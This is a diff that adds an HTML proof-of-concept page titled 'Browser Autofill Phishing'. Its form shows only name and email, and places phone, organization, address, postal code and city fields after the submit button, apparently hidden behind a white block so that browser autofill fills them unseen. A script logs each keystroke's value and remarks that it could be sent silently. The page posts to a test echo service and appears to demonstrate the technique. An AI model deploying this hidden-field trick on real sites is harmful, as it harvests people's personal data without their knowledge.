@@ -1,0 +1,48 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Browser Autofill Phishing</title>
+    <link rel="stylesheet" href="css/white_block.css">
+  </head>
+  <body>
+    <div id="form">
+      <form action="https://httpbin.org/post" method="post">
+        <p>
+          <label for="name">Name</label><br>
+          <input id="name" name="name" type="text" placeholder="Your Name">
+        </p>
+        <p>
+          <label for="email">Email</label><br>
+          <input id="email" name="email" type="email" placeholder="Your Email">
+        </p>
+        <p>
+          <input type="submit" value="Submit">
+        </p>
+        <p>
+          <input id="phone" name="phone" type="text" placeholder="Your Phone" >
+        </p>
+        <p>
+          <input id="organization" name="organization" type="text" placeholder="Your Organization" >
+        </p>
+        <p>
+          <input id="address" name="address" type="text" placeholder="Your Address" >
+        </p>
+        <p>
+          <input id="postal" name="postal" type="text" placeholder="Your Postal Code" >
+        </p>
+        <p>
+          <input id="city" name="city" type="text" placeholder="Your City" >
+        </p>
+      </form>
+    </div>
+    <div id="white-block"></div>
+    <script type="text/javascript">
+      function onchangehandler(event) {
+        // Print out its value. Could be a web request without users' knowledge.
+        console.log(event.target.name + ": " + event.target.value);
+      }
+      // Apply 'input' event to every input element
+      document.querySelectorAll('input').forEach(function(input) { input.addEventListener('input', onchangehandler); } );
+    </script>
+  </body>
+</html>
